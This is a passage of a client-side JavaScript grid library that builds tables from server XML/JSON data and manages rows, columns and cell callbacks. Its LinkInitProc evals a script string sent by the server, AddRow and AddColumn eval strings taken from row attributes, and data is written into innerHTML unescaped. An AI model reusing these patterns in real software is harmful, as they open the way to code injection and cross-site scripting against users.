this.blockResultId=null;
this.blockResultObject=null;


//Data from formtable
this.GridCellData="";
this.GridLinkData="";
this.GridFieldsData="";
this.GridSecurityData="";
this.GridHiddenData="";

//sub functional variable
this.ErrObj=null;
this.vjson=null;
this.dxml=null;
this.errCode=null;
this.errName=null;
this.errDesc=null;
this.Properties=null;

//======================================================
this.myName = function () 
{ 
    for (var name in this.global) 
      if (this.global[name] == this) 
        return name; 
} 
//======================================================
// Default Parametrebis Inicializacia
this.Init=function Init(tblId,clsName)
{
    if(local.vObjectOrId)
	{
		local.parent=local.vObjectOrId;
		if(typeof local.vObjectOrId !== "object"){
			var prev=local.xGet(local.vObjectOrId);
			if(prev){
				local=prev;
				return local;
			}
			local.parent=document.getElementById(local.vObjectOrId);
		}

		if(local.parent)
		{
		
			if(local.parent.id)
				local.ParentID=local.parent.id;
			else 
				local.ParentID=local.parent.id="xGridParentID"+local.ObjectCounter;

			if(local.parent.getAttribute("data-debug"))local.debug=local.parent.getAttribute("data-debug");

			if(!local.xChange)
			if(local.parent.getAttribute("data-onchange"))local.xChange=local.parent.getAttribute("data-onchange");

			if(!local.vUrl)
			if(local.parent.getAttribute("data-url"))local.vUrl=local.parent.getAttribute("data-url");
			
			if(!local.vCallBack)
			if(local.parent.getAttribute("data-callback"))local.vCallBack=local.parent.getAttribute("data-callback");
					
			if(!local.vDataType)
			if(local.parent.getAttribute("data-type"))local.vDataType=local.parent.getAttribute("data-type");
			if(!local.vDataType)local.vDataType="xml";
			
			if(!local.vNext)
			if(local.parent.getAttribute("data-next"))local.vNext=local.parent.getAttribute("data-next");
			
			if(!local.vClassName)
			if(local.parent.getAttribute("data-class"))local.vClassName=local.parent.getAttribute("data-class");
			
			vName='';
			if(!local.vTableId)
			if(local.parent.getAttribute("data-name"))vName=local.vTableId=local.parent.getAttribute("data-name");
			if(!local.vTableId)
			if(local.parent.getAttribute("data-id"))local.vTableId=local.parent.getAttribute("data-id");	
			if(!local.vTableId)
			if(local.parent.getAttribute("name"))vName=local.vTableId=local.parent.getAttribute("name");
			
			if(local.parent.getAttribute("data-tag"))local.TagType=local.parent.getAttribute("data-tag");
			

			xGridObjects[local.ObjectCounter]=local;
			if(local.parent.id)xGridObjectsById[local.parent.id]=local;
			if(local.vTableId)xGridObjectsById[local.vTableId]=local;
			
			local.QueryLink=local.vUrl;
			local.QueryProc=local.vCallBack;
			local.QueryType=local.vDataType;
			local.tableClassname=local.vClassName;
			local.nextFN=local.vNext;
			local.tableId=local.vTableId;
			local.name=vName;
		}
	}
	local.LoadGridContent();
return local;
}

this.LoadGridContent=function LoadGridContent(tblId,clsName)
{
    local.Clear();
    if(!tblId)tblId=local.tableId;
	local.tableId=tblId;
	
	if(!clsName)clsName=local.tableClassname;
	local.tableClassname=clsName;
	
	var tblRow;
	if(local.TagType=="div")
	{
		local.tableObject= document.createElement("div");
		local.tableHead = document.createElement("div");
		local.tableBody = document.createElement("div");
		local.tableFoot = document.createElement("div");		
		tblRow = document.createElement("div");
		
		local.tableObject.className="table";
		local.tableHead.className="thead";
		local.tableBody.className="tbody";
		local.tableFoot.className="tfoot";
		tblRow.className="tr";
	}
	else
	{
		local.tableObject= document.createElement("table");
		local.tableHead = document.createElement("thead");
		local.tableBody = document.createElement("tbody");
		local.tableFoot = document.createElement("tfoot");
		tblRow = document.createElement("tr");
	}
	
	
	local.tableObject.id=tblId;
	if(clsName)local.tableObject.className+=' '+(clsName || '');
	tblRow.id=tblId+'_'+String(local.rowLatestID);
	
	local.tableHead.appendChild(tblRow);	
	local.tableObject.appendChild(local.tableHead);
	local.tableObject.appendChild(local.tableBody);
	local.tableObject.appendChild(local.tableFoot);
	
	local.rowCount++;
	local.rowLatestID++;
	local.LinkTableID="id";
	
	if(local.QueryLink)local.SetLink(local.QueryLink,local.QueryProc);else local.SetLink("");
	return local;
}
//======================================================
this.AddFooter=function AddFooter(vList,vAttributes)//[1,2,3,4],{"class":"anim","style=\"width:100px;\""}
{
	var tblRow;
	if(local.TagType=="div")
	{
		tblRow = document.createElement("div");
		tblRow.className="tr";
		for(var i=0;i<vList.length;i++)
		{
			var tblTd = document.createElement("div");
			tblTd.className="td";
			tblTd.innerHTML=vList[i];
			if(vAttributes && vAttributes[i] && typeof vAttributes[i] == "object"){
				for(var k in vAttributes[i]){
					if(k.toLowerCase()=="class")
						addClass(tblTd,vAttributes[i][k]);
					else tblTd.setAttribute(k,vAttributes[i][k]);
				}
			}
			tblRow.appendChild(tblTd);
		}
	}
	else
	{
		tblRow = document.createElement("tr");
		for(var i=0;i<vList.length;i++)
		{
			var tblTd = document.createElement("div");
			tblTd.className="td";
			tblTd.innerHTML=vList[i];
			if(vAttributes && vAttributes[i] && typeof vAttributes[i] == "object"){
				for(var k in vAttributes[i]){
					if(k.toLowerCase()=="class")
						addClass(tblTd,vAttributes[i][k]);
					else tblTd.setAttribute(k,vAttributes[i][k]);
				}
			}
			tblRow.appendChild(tblTd);
		}
	}
	local.tableFoot.appendChild(tblRow);
}
//======================================================
this.Clear=function Clear()
{
    RemoveObjectEx(local.tableObject);
	local.tableObject="";
	local.GridCellData="";
	local.GridLinkData="";
	local.GridFieldsData="";
	local.GridSecurityData="";
	local.GridHiddenData="";
	
	local.rowCount=0;
	local.rowLatestID=0;
	local.colCount=0;
	local.colLatestID=0;
	local.hasDataHeader=0;
	local.firstInitialize=0;
	
	if(local.columnsId && local.columnsId.clear)local.columnsId.clear();else local.columnsId=new Array();
	if(local.columnsDBId && local.columnsDBId.clear)local.columnsDBId.clear();else local.columnsDBId=new Array();
	if(local.columnsDBField && local.columnsDBField.clear)local.columnsDBField.clear();else local.columnsDBField=new Array();
	if(local.columnsCallbacks && local.columnsCallbacks.clear)local.columnsCallbacks.clear();else local.columnsCallbacks=new Array();
	if(local.rowsId && local.rowsId.clear)local.rowsId.clear();else local.rowsId=new Array();
	if(local.rowsDBId && local.rowsDBId.clear)local.rowsDBId.clear();else local.rowsDBId=new Array();
  
}
//======================================================
this.getXMLNodeValue=function getXMLNodeValue(ElXML)
{
   var ret='';

   if(ElXML && ElXML.childNodes && ElXML.childNodes.length)
   {
		for(var i=0;i<ElXML.childNodes.length;i++)ret+=ElXML.childNodes[i].nodeValue;
   }
   else
   if(ElXML && ElXML.nodeValue)ret=ElXML.nodeValue;
   
   return ret;
}
//======================================================
this.LinkInitProc=function LinkInitProc(dxml)
{
	local.QueryResponse=dxml;
	var ErrObj=local.ErrObj=local.DBError(dxml);
	var vjson=local.vjson=local.dxml=dxml;

	var errCode=local.errCode=ErrObj.code;
	var error=local.error=ErrObj.error;
	var Properties=local.Properties=local.DBProperties(dxml);
	
	//alert();
	if(errCode==0)
	{
		var Details=Properties.details;
		var Fields=Properties.fields;
		local.LinkTableID=Properties.tableid;
		var JScript=Properties.jscript;
				
		var GridCellData,GridLinkData,GridFieldsData,GridSecurityData,GridHiddenData;
		
		if(JScript)eval(JScript);
		
		local.GridCellData=(GridCellData?GridCellData:Properties.rows);
		local.GridLinkData=(GridLinkData?GridLinkData:Properties.links);
		local.GridFieldsData=(GridFieldsData?GridFieldsData:Fields);
		local.GridSecurityData=(GridSecurityData?GridSecurityData:Properties.security);
		local.GridHiddenData=(GridHiddenData?GridHiddenData:Properties.hiddens);
		local.hasDataHeader=1;
		
		if(local.debug)console.log(local.ParentID+"=>LinkInitProc; CellData.length: "+local.GridCellData.length+"; ");
		//local.AddColumn(GridArr[0]);
		
		local.AddRow(0,0,local.GridCellData,local.GridLinkData,0,local.GridFieldsData,local.GridSecurityData,local.GridHiddenData);
		local.Draw();
		local.firstInitialize=1;
		if(local.QueryProc)
		{
			if(typeof local.QueryProc == "function")
				local.QueryProc(local);
			else
			if(typeof local.QueryProc == "string")
				window[local.QueryProc](local);

		
		}

	}else
	{
		console.log('jc_grid.LinkInitProc Error: ('+local.ParentID+') '+(errCode || '')+';');
	}
	
}

//======================================================
this.SetLink=function SetLink(QueryLink,QueryProc)
{
	local.QueryLink=QueryLink;
	local.QueryProc=QueryProc;
	if(local.QueryLink && local.QueryLink!="")
	{
		var lnks=local.QueryLink.split("?");
		local.DefLink=lnks[0];
		local.DefParams=lnks[1];
		local.PostParams=lnks[1];

		var bSR=new SendRecv();
		if(local.QueryType=="xml")bSR.PROCXML=local.LinkInitProc;
		else
		if(local.QueryType=="json")bSR.PROCJSON=local.LinkInitProc;
		//bSR.Query(local.DefLink+'?phpParam=jc_query&'+SIDNAME+'='+SID+'&UNIQREQUESTID='+GLOB_SEND_ID,'',local.PostParams);
		bSR.Query(local.DefLink+'?'+local.DefParams+'&UNIQREQUESTID='+GLOB_SEND_ID,'',local.PostParams);
	}
}
//======================================================
this.ResetLink=function ResetLink(QueryLink,QueryProc)
{
	local.tableBody.innerHTML="";
	if(!QueryLink)QueryLink=local.QueryLink;
	if(!QueryProc)QueryProc=local.QueryProc;
	local.SetLink(QueryLink,QueryProc);
}
//======================================================
this.AddonLink=function AddonLink(QueryLink,QueryProc)
{
	local.tableBody.innerHTML="";
	if(QueryLink)QueryLink=getLinkEx(local.QueryLink+QueryLink);
	if(!QueryProc)QueryProc=local.QueryProc;
	local.SetLink(QueryLink,QueryProc);
}

//======================================================
this.GetNumberByRef=function GetNumberByRef(RefNumber)
{
	if(!RefNumber)RefNumber='';else RefNumber=String(RefNumber);
    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="$")&&(p2=local.rowsId.indexOf(RefNumber.substring(1))))
	{
	    RefNumber=p2;//RefNumber.substring(1);
	}
	
    var p2;
    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="#")&&(p2=local.rowsDBId.indexOf(RefNumber.substring(1))))
	{
	    RefNumber=p2;
	}

	if(isNaN(parseInt(RefNumber)))return 0;
	if(parseInt(RefNumber)==-1)RefNumber=1;
return parseInt(RefNumber);

}
//======================================================
this.GetRefColumn=function GetRefColumn(RefNumber)//$ - Number Collumn, #-ID Collumn
{
	if(!RefNumber)RefNumber='';
    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="$"))
	if((local.columnsId[RefNumber.substring(1)]))
	{
	    RefNumber=local.columnsId[RefNumber.substring(1)];
	}else return 0;
	
	var p2;
    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="#"))
	if((p2=local.columnsDBId.indexOf(RefNumber.substring(1)))&&(local.columnsId[p2]))
	{
	    RefNumber=local.columnsId[p2];
	}else return 0;
	
	if(isNaN(parseInt(RefNumber)))return 0;
return parseInt(RefNumber);
}
//======================================================
this.GetRefRow=function GetRefRow(RefNumber)
{
	if(!RefNumber)RefNumber='';else RefNumber=String(RefNumber);

    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="$")&&(local.rowsId[RefNumber.substring(1)]))
	{
	    RefNumber=local.rowsId[RefNumber.substring(1)];
	}

    var p2;
    if ((isNaN(parseInt(RefNumber)))&&(RefNumber.charAt(0)=="#")&&(p2=local.rowsDBId.indexOf(RefNumber.substring(1)))&&(local.rowsId[p2]))
	{
	    RefNumber=local.rowsId[p2];
	}

return parseInt(RefNumber);
}

//======================================================
//Append Element
this.Draw=function Draw(vParID)
{
	var obj;
	if(!vParID)vParID="";

	if(typeof (vParID) === "object")
	{
		obj=vParID;
		if(obj.id)local.ParentID=vParID=obj.id;
		else {
			local.ParentID=vParID=obj.id="xGridParentID"+local.ObjectCounter;
		}
	}
	else
	{
		if(!vParID)vParID=local.ParentID;
		else local.ParentID=vParID;
	
		if(vParID.length>0)
		{
			obj=document.getElementById(vParID);
			obj.innerHTML="";
		}
		
		if(!obj)obj=document.createElement("div");
	}

	obj.appendChild(local.tableObject);
return obj;
}
//======================================================
this.InsertColumn=function InsertColumn(RefNumber,clsName,vCallBack)
{
	local.AddColumn('',clsName,RefNumber,'','',vCallBack);
}
//======================================================
this.AddFuncColumn=function (val,vCallBack,RefNumber,clsName)
{
	local.AddColumn(val,clsName,RefNumber,'','',vCallBack);
}
//======================================================
this.AddColumn=function AddColumn(val,clsName,RefNumber,fldsValue,fldsName,vCallBackParam)//RefNumber for insert
{
   var spos=0;
   if(RefNumber)
   {
		spos=local.GetNumberByRef(RefNumber);
		RefNumber=local.GetRefColumn(RefNumber);
   }
   
   if(!fldsValue)fldsValue=new Array();
   else if(!Array.isArray(fldsValue))fldsValue=[fldsValue];
   
   if(!fldsName)fldsName=new Array();
   else if(!Array.isArray(fldsName))fldsName=[fldsName];

   var vCallBack=new Array();
   if(vCallBackParam)if(!Array.isArray(vCallBackParam))vCallBack=[vCallBackParam];

   var massive=0;
   if(Array.isArray(val))massive=val.length;
   else {val=[val];massive=1;}
		
   
   var classArrCheck=0;if(clsName)classArrCheck=Array.isArray(clsName);
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   var i=0,j=0;

   for(i=0;i<trs.length;i++)
   {
	  for(j=0;j<massive;j++)
	  {
		var tblCol;
		if(local.TagType=="div")
		{
			tblCol = document.createElement("div");
			tblCol.className="td";
		}
		else
		{
			tblCol = document.createElement("td");
		}
			
		tblCol.id=String(trs[i].id)+'_'+String(local.colLatestID+j);
		
		
		if(classArrCheck)
			tblCol.className+=' '+(clsName[j % clsName.length] || '');
		else
			if(clsName)tblCol.className+=' '+(clsName || '');
			
		if(!vCallBack[j % vCallBack.length])vCallBack[j % vCallBack.length]=local.columnsCallbacks[local.colLatestID+j];
		
		if(vCallBack && vCallBack[j % vCallBack.length])
		{
			local.columnsCallbacks[local.colLatestID+j]=vCallBack[j % vCallBack.length];
			try{
				var innerHTML='';
				var result={};
				var cursor={func:"AddColumn",myName:local.myName(),myId:local.tableId};
				cursor.row=trs[i];
				cursor.rowN=i;
				cursor.rowId=cursor.myName+"_"+cursor.rowN;
				cursor.dbId=trs[i].getAttribute('rowid');
				
				eval("cursor.hiddenData="+trs[i].getAttribute('rowhiddendata'));
				if(!cursor.hiddenData)cursor.hiddenData={};
				
				cursor.cell=tblCol;
				cursor.cellId=tblCol.id;
				cursor.cellNumber=local.colLatestID+j;
				cursor.oldHTML='';
				cursor.newHTML=(typeof val[j] != "undefined" ? val[j] :'') || '';
				cursor.HTML=cursor.newHTML;
				
				var vsec=trs[i].getAttribute('rowsecurity');
				cursor.Security={main:1};
				if(String(vsec).length>8)
				{
					eval("vsec="+vsec);
					cursor.Security=vsec;
				}
				//console.log(typeof vCallBack[j % vCallBack.length] +" "+vCallBack[j % vCallBack.length]);
				if(typeof vCallBack[j % vCallBack.length] !== "function")
				{
					eval(vCallBack[j % vCallBack.length]);
				}
				else
				{
					result=vCallBack[j % vCallBack.length](cursor);
					switch(typeof result)
					{
						case 'object':innerHTML=result.innerHTML;break;
						case 'string':innerHTML=result;break;
						default:innerHTML=result;
					}
				}
				
				tblCol.innerHTML=innerHTML;
				
			}
			catch(e)
			{
				tblCol.innerHTML=(typeof val[j] !="undefined" ? val[j] :'') || '';
				console.log('jc_grid addCollumn: '+e);
			}

		}
		else
		{
			tblCol.innerHTML=(typeof val[j] != "undefined" ? val[j] :'') || '';
		}
			
		if(RefNumber)
		{
			trs[i].insertBefore(tblCol,document.getElementById(String(trs[i].id)+'_'+RefNumber));
		}
		else
		{
			trs[i].appendChild(tblCol);
		}

		if(i==0)
		{
			if(RefNumber)
			{
				//console.log(local.columnsDBField);
				local.colCount=local.columnsDBField.length;
				//console.log(spos+"; "+local.colCount);
				for(xi=local.colCount;xi>spos;xi--)
				{
					local.columnsId[xi]=local.columnsId[xi-1];
					local.columnsDBId[xi]=local.columnsDBId[xi-1];
					local.columnsDBField[xi]=local.columnsDBField[xi-1];
					local.columnsCallbacks[xi]=local.columnsCallbacks[xi-1];
					
				}
				local.columnsId[xi]=(local.colLatestID+j);
				if(fldsValue && fldsValue[j])local.columnsDBId[xi]=fldsValue[j];else local.columnsDBId[xi]=0;
				if(fldsName && fldsName[j])
				{
					local.columnsDBField[xi]=fldsName[j];
					local.columnsCallbacks[xi]=vCallBackParam;
				}
				else
				{
					local.columnsDBField[xi]=val[j];
					local.columnsCallbacks[xi]=vCallBackParam;
				}
				local.colCount++;
			}
			else
			{		
				local.colCount=local.columnsId.length;
				local.columnsId[local.colCount]=local.colLatestID+j;
				if(fldsValue && fldsValue[j])local.columnsDBId[local.colCount]=fldsValue[j];else local.columnsDBId[local.colCount]=0;
				if(fldsName && fldsName[j])local.columnsDBField[local.colCount]=fldsName[j];else local.columnsDBField[local.colCount]=val[j];
				local.colCount++;
			}//RefNumber
		}
	  }
   }
   

	if(j>0)
	{
		local.colLatestID+=massive;
	}
	else
	{
		local.colLatestID++
		local.colCount++;
	}
   
}
//======================================================
this.RemoveColumn=function RemoveColumn(RefNumber)
{
   var spos=local.GetNumberByRef(RefNumber);
   RefNumber=local.GetRefColumn(RefNumber);
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   var i;
   for(i=0;i<trs.length;i++)
   {
	  var tblCol=document.getElementById(String(trs[i].id)+'_'+String(RefNumber));
	  trs[i].removeChild(tblCol);
   }
   
   local.colCount--;
   for(i=spos;i<local.colCount;i++)
   {
		local.columnsId[i]=local.columnsId[i+1];
		local.columnsDBId[i]=local.columnsDBId[i+1];
		local.columnsDBField[i]=local.columnsDBField[i+1];
   }
   local.columnsId[i]=0;
   local.columnsDBId[i]=0;
   local.columnsDBField[i]=0;
   
}
//======================================================
this.HideColumn=function HideColumn(RefNumber)
{
	RefNumber=local.GetRefColumn(RefNumber);
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   var i;
   for(i=0;i<trs.length;i++)
   {
	  var tblCol=document.getElementById(String(trs[i].id)+'_'+String(RefNumber));
	  HideObjectEx(tblCol);
   }
}
//======================================================
this.ShowColumn=function ShowColumn(RefNumber)
{
	RefNumber=local.GetRefColumn(RefNumber);
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   var i;
   for(i=0;i<trs.length;i++)
   {
	  var tblCol=document.getElementById(String(trs[i].id)+'_'+String(RefNumber));
	  ShowObjectEx(tblCol);
   }
}
//======================================================
this.InsertRow=function InsertRow(RefNumber,clsName,vHtmls,vIds,vSecurity,vHiddens)
{
	if(!vHtmls)vHtmls='';
	if(!vIds)vIds='';
	if(!clsName)clsName='';
	if(!RefNumber)RefNumber='';
	if(!vSecurity)vSecurity='';
	if(!vHiddens)vHiddens='';
	
	return local.AddRow(clsName,1,vHtmls,vIds,RefNumber,'',vSecurity,vHiddens);
}
//======================================================
this.AppendRow=function AppendRow(vCell,vIds,vHasHeader,vSecurity,vHiddens)
{
	if(!vCell)vCell='';
	if(!vIds)vIds='';
	if(!vSecurity)vSecurity='';
	if(!vHiddens)vHiddens='';
	local.hasDataHeader=0;
	if(vHasHeader)local.hasDataHeader=vHasHeader;
	else local.hasDataHeader=0;
	return local.AddRow(0,vCell.length,vCell,vIds,0,'',vSecurity,vHiddens);
}
//======================================================
this.gridVarToObjectText=function(vVar,cnt)
{
    var attr='{',firstname='';
    if(vVar && vVar.main){attr+="main:"+vVar.main;firstname="main";}
	else
	if(vVar && vVar.id){attr+="id:'"+vVar.id+"'";firstname="id";}

	if(vVar)
	{
		for(var b in vVar)
		if(b!=firstname)
		{
			if(attr!="{")attr+=",";
			if(isNaN(parseInt(vVar[b][cnt]*1)) && (typeof vVar[b][cnt] != "undefined"))
				attr+=b+":'"+vVar[b][cnt]+"'";
			else 
				attr+=b+":"+vVar[b][cnt];
		}
	}
	attr+="}";
	return attr;
}
//======================================================
this.AddRow=function AddRow(clsName,RCounts,vHtmls,vIds,RefNumber,vFields,vSecurity,vHiddens)//vHtmls[row][col] for value, vIds[list] - for rowid DBId, RefNumber - for insert
{
  if(!vIds)vIds=[];
//console.log(local.ParentID+"=>AddRow ;Ref:"+RefNumber+"; RCounts:"+ RCounts+"; vHtml.Length:"+vHtmls.length+"; vIds.length:"+vHtmls.length+"; vFields:"+vFields+"; vSecurity:"+vSecurity+"; vHiddens:"+vHiddens);
	if(!RefNumber)RefNumber='';
    var spos=local.GetNumberByRef(RefNumber);
	var tblRow="noResult";
    RefNumber=local.GetRefRow(RefNumber);
	
	if((RCounts=='')||(RCounts==0)||(RCounts==undefined))
		if(vHtmls && vHtmls.length>0)
			RCounts=vHtmls.length;
		else 
			RCounts=1;

	var cnt=0;
	if(local.colCount==0 && vHtmls && vHtmls.length>0)
	{
		local.AddColumn(vHtmls[0],'','',0,vFields);
		RCounts=vHtmls.length
		if(RCounts>1)cnt=1;
	}else
	if(local.hasDataHeader>0)
	{
	   cnt=1;
	}
	
	
//	console.log(vIds+"; hsd: "+local.hasDataHeader);
//	console.log("cnt:"+cnt+"; RCounts:"+RCounts+"; vHtmls:"+vHtmls+"; ");
	
	
	if(!vSecurity)vSecurity={main:1};
	if(!vHiddens)vHiddens={id:"id"};
/*local.hasDataHeader -ს გამო შესაძლოა ჩანაწერის დამატება ვერ მოხდეს*/
    if(cnt<RCounts)
	for(;cnt<RCounts;cnt++)
	{
		var isUpdate=false,idx=-1;
		tblRow=0;
		if(vHtmls && vIds && vIds[cnt])
		{
			//tblRow.setAttribute('rowid',vIds[cnt]);
			var idx=local.rowsDBId.indexOf(vIds[cnt]);
			if(idx!=-1)
			{
				isUpdate=true;
				idx=local.rowsId[idx];
			}
			
		}
		else vIds[cnt]=0;//'0'
		
		if(isUpdate)
		{
			tblRow = document.getElementById(local.tableObject.id+'_'+idx);
		}
		
		//console.log(isUpdate+"; idx:"+idx+"; id:"+vIds[cnt]);
		//console.log(local.rowsDBId);
		//console.log(tblRow);
		
		if(!tblRow)
		{
			if(local.TagType=="div")
			{
				tblRow = document.createElement("div");
				tblRow.className="tr";
			}
			else
			{
				tblRow = document.createElement("tr");
			}
				
			tblRow.id=local.tableObject.id+'_'+String(local.rowLatestID);
			isUpdate=false;
		}

		tblRow.setAttribute('rowid',vIds[cnt]);
		
		var attr=local.gridVarToObjectText(vSecurity,cnt);
		tblRow.setAttribute('rowsecurity',attr);
		
		var hddns=local.gridVarToObjectText(vHiddens,cnt);
		tblRow.setAttribute('rowhiddendata',hddns);
		
		
		
		if(clsName)tblRow.className+=' '+clsName;
		
		for(var i=0;i<local.colCount;i++)
		{
			var tblCol=0;
			if(isUpdate)
			{
				tblCol = document.getElementById(String(tblRow.id)+'_'+String(local.columnsId[i]));
			}
			
			if(!tblCol)
			{
				if(local.TagType=="div")
				{
					tblCol = document.createElement("div");
					tblCol.className="td";
				}
				else
				{
					tblCol = document.createElement("td");
				}
					
				tblCol.id=tblRow.id+'_'+String(local.columnsId[i]);
			}

			var vCallBack=0;
			if(local.columnsCallbacks[i])vCallBack=local.columnsCallbacks[i];
			
			//console.log(tblCol);
			//console.log("Bool:"+vHtmls && vHtmls[cnt] && vHtmls[cnt][i]);
			//console.log(vHtmls);
			//console.log(vHtmls[cnt]);
			//console.log(vHtmls[cnt][i]);
			//tblCol.innerHTML=vHtmls[cnt][i];

			if(vCallBack)
			{
				try
				{
				var innerHTML='';
				var cursor={func:"AddRow",myName:local.myName(),myId:local.tableId};
				if(RefNumber)cursor.rowN=spos;
				else cursor.rowN=local.rowCount;
				cursor.row=tblRow;
				cursor.rowId=cursor.myName+"_"+cursor.rowN;
				cursor.dbId=vIds[cnt];
				cursor.cell=tblCol;
				cursor.cellId=tblCol.id;
				cursor.oldHTML='';
				cursor.newHTML=(typeof vHtmls[cnt][i] != "undefined" ? vHtmls[cnt][i] :'') || '';
				cursor.HTML=cursor.newHTML;
				
				var vsec=attr;
				cursor.Security={main:1};
				if(String(vsec).length>8)
				{
					eval("vsec="+vsec);
					cursor.Security=vsec;
				}
				
				eval(vCallBack);
				tblCol.innerHTML=innerHTML;
				}
				catch(e)
				{
				tblCol.innerHTML='Error: '+e.message;
				}
			}
			else
			if(vHtmls && vHtmls[cnt] && vHtmls[cnt][i])
				/*if(vHtmls[cnt][i].length>128)
					tblCol.innerHTML=getInnerTextFromString(vHtmls[cnt][i]).substr(0,120)+'...';
				else*/
					tblCol.innerHTML=vHtmls[cnt][i];
			
			if(!isUpdate)tblRow.appendChild(tblCol);
		}
	
	
		if(!isUpdate && (cnt>0 || local.hasDataHeader==0))
		{
			if(RefNumber)
			{
				local.tableBody.insertBefore(tblRow,document.getElementById(local.tableObject.id+'_'+RefNumber));	
				//if(spos==-1)spos=1;
				for(i=local.rowCount;i>spos;i--)
				{
					local.rowsId[i]=local.rowsId[i-1];
					local.rowsDBId[i]=local.rowsDBId[i-1];
				}
				local.rowsId[i]=String(local.rowLatestID);
				local.rowsDBId[i]=vIds[cnt];
			}
			else
			{	
				local.tableBody.appendChild(tblRow);	
				local.rowsId[local.rowCount]=String(local.rowLatestID);
				local.rowsDBId[local.rowCount]=vIds[cnt];
			}	

			local.rowCount++;
			local.rowLatestID++;
		}
	}
	else
	{
		console.log("AddRow: RCount=cnt; No New Row");
	}
return tblRow;
}
//======================================================
this.RemoveRow=function RemoveRow(RefNumber)
{
   var spos=local.GetNumberByRef(RefNumber);
   //RefNumber=local.GetRefRow(RefNumber);
   var o=local.GetRowObject(RefNumber);
   if(o)
   {
		RemoveObjectEx(o);
		local.rowCount--;
		for(i=spos;i<local.rowCount;i++)
		{
			local.rowsId[i]=local.rowsId[i+1];
			local.rowsDBId[i]=local.rowsDBId[i+1];
		}
		local.rowsId[i]=0;local.rowsId.length--;
		local.rowsDBId[i]=0;local.rowsDBId.length--;
   }
}
//======================================================
this.HideRow=function HideRow(RowN)
{
   HideObjectEx(local.GetRowObject(RowN));
}
//======================================================
this.ShowRow=function ShowRow(RowN)
{
   ShowObjectEx(local.GetRowObject(RowN));
}
//======================================================
this.GetRowObjectIdName=function GetRowObjectIdName(RowN)
{
    var arrs=String(RowN).split("_");
	if(arrs.length>0)RowN=arrs[0];
	RowN=local.GetRefRow(RowN);
	return local.tableObject.id+'_'+String(RowN);
}
//======================================================
this.GetCellObjectIdName=function GetCellObjectIdName(RowN,ColN)
{
    var arrs=String(RowN).split("_");
	if(arrs.length>1){RowN=arrs[0];ColN=arrs[1];}
	RowN=local.GetRefRow(RowN);
	ColN=local.GetRefColumn(ColN);
	return local.tableObject.id+'_'+String(RowN)+'_'+ColN;
}
//======================================================
this.GetRowObject=function GetRowObject(RowN)
{
	return (local.CurrentRow=document.getElementById(local.GetRowObjectIdName(RowN)));
}
//======================================================
this.GetRowDBId=function (RowN)
{
	var rw=local.GetRowObject(RowN);
	return rw.getAttribute('rowid');
}
//======================================================
this.GetCellObject=function GetCellObject(RowN,ColN)
{
	return (local.CurrentCell=document.getElementById(local.GetCellObjectIdName(RowN,ColN)));
}
//======================================================
/*naklebad gamoikeneba es funkcia*/
this.GetColumnIdByFieldName=function GetColumnIdByFieldName(ColName)
{
    return local.columnsDBField.indexOf(ColName);
}
//======================================================
this.GetCellByName=function GetCellByName(RowN,ColName)
{
    if(!RowN)RowN=local.CurrentRow;
    var ColN=local.columnsDBField.indexOf(ColName);
	if(ColN==-1)return '';
	return (local.CurrentCell=document.getElementById(local.GetCellObjectIdName(RowN,ColN)));
}
//======================================================
this.GetCellValue=function GetCellValue(RowN,ColName)
{
	if(!RowN)RowN=local.CurrentRow;
    var ColN=local.columnsDBField.indexOf(ColName);
	if(ColN==-1)return '';
	var vl=document.getElementById(local.GetCellObjectIdName(RowN,ColN));
	if(!vl)return '';
	local.CurrentCell=vl;
	return vl.innerHTML;
}
//========================================================
this.GetTRCount=function GetTRCount()
{
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   return trs.length;
}
//========================================================
this.GetRowCount=function GetRowCount()
{
   return local.rowCount;
}

//======================================================
this.SetCellHTML=function SetCellHTML(vCell,vHtml)
{
    if((typeof vCell != "object"))
	{
		vCell=local.GetCellObject(vCell);
	}
    if(!vCell)vCell=local.CurrentCell;
	
	vCell.innerHTML=vHtml;
}
//======================================================
this.SetCellText=function SetCellText(vCell,vText)
{
    if((typeof vCell != "object"))
	{
		vCell=local.GetCellObject(vCell);
	}
    if(!vCell)vCell=local.CurrentCell;
	vCell.innerText=vText;
}
//======================================================
this.SetFieldCallBack=function (vField,callback)
{
/***
Field-is daxatvisas gamoidzaxeba procedura callback parametrebit, RowNumber, FieldRef
*/
}
//======================================================
this.GetFieldName=function (vFieldIdx)
{
/***
daabrunebs field-is saxels;
*/
}

//======================================================
this.SetRowValues=function SetRowValues(vRow,vHtmls,vFields,vSecAttribute,vHidensAttribute)
{
	if(!vFields)vFields=new Array();
    if((typeof vRow != "object"))
	{
		vRow=local.GetRowObject(vRow);
	}
	
	vRow.setAttribute("rowsecurity",vSecAttribute);
	vRow.setAttribute("rowhiddendata",vHidensAttribute);


	var tds=vRow.getElementsByTagName("td"),idx;
	if(local.TagType=="div")tds=local.tableObject.getElementsByClassName("td");
	if(Array.isArray(vFields))
	{
		for(var i=0;i<vFields.length;i++)
		{
			idx=local.columnsDBField.indexOf(vFields[i]);
			tds[idx].innerHTML=vHtmls[i];
		}
	}
	else
	for(var i=0;i<tds.length;i++)
	{
		tds[i].innerHTML=vHtmls[i];
	}
}

//======================================================
this.Refresh=function Refresh()
{
   local.Clear();
   local.LoadGridContent();
}

//======================================================
//========== DB Function ============================================
//======================================================
this.DBError=function DBError(dxml)
{
	var error,errCode,errName,errDesc,ErrObj,Details,FieldsStr,Fields,JScript;
	var vjson=dxml;
	error=errCode=0;errName=errDesc='';

	if(local.QueryType=="xml")
	{
		try{error=dxml.getElementsByTagName('error')[0];}catch(e){error=errCode=0;errName=errDesc='';}
		if(error)
		{
